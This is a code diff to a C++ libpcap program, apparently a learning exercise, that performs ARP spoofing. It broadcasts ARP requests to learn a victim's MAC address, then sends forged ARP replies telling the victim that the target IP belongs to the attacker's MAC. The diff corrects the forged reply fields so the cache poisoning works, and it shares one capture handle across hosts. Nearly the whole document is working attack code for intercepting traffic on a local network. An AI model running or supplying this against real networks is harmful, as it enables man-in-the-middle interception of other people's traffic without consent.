@@ -3,6 +3,7 @@
 #include <stdlib.h>
 #include <iostream>
 #include <pcap.h>
+#include <vector>
 #include <map>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
@@ -10,8 +11,6 @@
 #include <unistd.h>
 #include "ethhdr.h"
 #include "arphdr.h"
-#include "ip.h"
-#include "mac.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -22,7 +21,7 @@ struct EthArpPacket final {
 
 using namespace std;
 
-unsigned char* get_my_MAC(char* iface) {
+char* get_my_MAC(const char* iface) {
     int fd;
     struct ifreq ifr;
     unsigned char *mac = NULL;
@@ -34,7 +33,9 @@ unsigned char* get_my_MAC(char* iface) {
         mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
 	}
     close(fd);
-    return mac;
+	char* mac_p=(char*)malloc(18);
+	snprintf(mac_p,18,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
+    return mac_p;
 }
 char* get_my_IP(const char *iface) {
     	int fd;
@@ -61,16 +62,10 @@ char* get_my_IP(const char *iface) {
  }
 
 
-Mac get_sender_MAC(char* dev, Ip s_IP, Ip m_IP,Mac m_MAC){
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-	}
-
+Mac get_sender_MAC(pcap_t* handle,char* dev,Ip s_IP, Ip m_IP, Mac m_MAC){
 	EthArpPacket packet;
 
-	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
+	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
 	packet.eth_.smac_ = m_MAC;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -84,29 +79,34 @@ Mac get_sender_MAC(char* dev, Ip s_IP, Ip m_IP,Mac m_MAC){
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
 	packet.arp_.tip_ = htonl(s_IP);
 
-	int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	if (res_send != 0) {
-		fprintf(stderr, "1pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
+	int res= pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "1pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		return Mac("00:00:00:00:00:00");
 	}
-	struct pcap_pkthdr *header;
-	const unsigned char *pkt_data;
-	int res_get = pcap_next_ex(handle,&header,&pkt_data);
-	if (res_get != 1) {
-		fprintf(stderr, "2pcap_sendpacket return %d error=%s\n", res_get, pcap_geterr(handle));
+	struct pcap_pkthdr* header;
+	const u_char* pkt_data;
+	while(1){
+		res=pcap_next_ex(handle, &header, &pkt_data);
+		if(res==0){
+			continue;
+		}
+		struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
+        struct ArpHdr* res_arp_packet=(struct ArpHdr*)(pkt_data+sizeof(EthHdr));
+
+		if(res_eth_packet->type()==EthHdr::Arp&&res_arp_packet->op()==ArpHdr::Reply&&res_arp_packet->sip()==Ip(s_IP)){
+			Mac sender_mac = Mac(res_eth_packet->smac_);
+			const uint8_t* mac_addr=(const uint8_t*)sender_mac;
+			for(int i=0;i<6;i++){
+				printf("%02x",mac_addr[i]);
+				printf(":");
+			}
+			return sender_mac;
+		}	
 	}
-	packet.eth_.dmac_=pkt_data;
-	pcap_close(handle);
-	return packet.eth_.dmac_;
 }
 
-void spoofing(char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
-	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
-	if (handle == nullptr) {
-		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
-		return ;
-	}
-
+void spoofing(pcap_t* handle,char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
 	EthArpPacket packet;
 
 	packet.eth_.dmac_ = s_MAC;
@@ -118,16 +118,16 @@ void spoofing(char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Reply);
-	packet.arp_.smac_ = s_MAC;
+	packet.arp_.smac_ = m_MAC;
 	packet.arp_.sip_ = htonl(t_IP);
-	packet.arp_.tmac_ = m_MAC;
+	packet.arp_.tmac_ = s_MAC;
 	packet.arp_.tip_ = htonl(s_IP);
 
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
-	pcap_close(handle);
+
 }
 
 void usage() {
@@ -140,23 +140,29 @@ int main(int argc, char* argv[]) {
 		usage();
 		return -1;
 	}
-
-	map<Ip,Mac> map;
 	char* dev = argv[1];
-	unsigned char* my_MAC=get_my_MAC(dev);
+	map<Ip,Mac> ipmap=map<Ip,Mac>();
+	char* mac=get_my_MAC(dev);
+	Mac my_MAC=Mac(mac);
+	char errbuf[PCAP_ERRBUF_SIZE];
+	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
+	if(handle==nullptr){
+		fprintf(stderr,"couldn't open device %s(%s)\n",dev,errbuf);
+		return -1;
+	}
 	char* my_ip=get_my_IP(dev);
-	Ip my_IP(my_ip);
+	Ip my_IP=Ip(my_ip);
 	for(int i=1;i<argc/2;i++){
 		Ip send_IP(argv[i*2]);
 		Ip tar_IP(argv[i*2+1]);
 		Mac send_MAC;
-		if(map.find(send_IP)!=map.end()){
-			send_MAC = map[send_IP];
+		if(ipmap.find(send_IP)!=ipmap.end()){
+			send_MAC =ipmap[send_IP];
 		}else{
-			send_MAC=get_sender_MAC(dev,send_IP,my_IP,my_MAC);
-			map[send_IP]=send_MAC;
+			send_MAC=get_sender_MAC(handle,dev,send_IP,my_IP,my_MAC);
+			ipmap[send_IP]=send_MAC;
 		}
-		spoofing(dev,send_MAC,my_MAC,send_IP,tar_IP);
+		spoofing(handle,dev,send_MAC,my_MAC,send_IP,tar_IP);
 	}
 	return 0;
 }
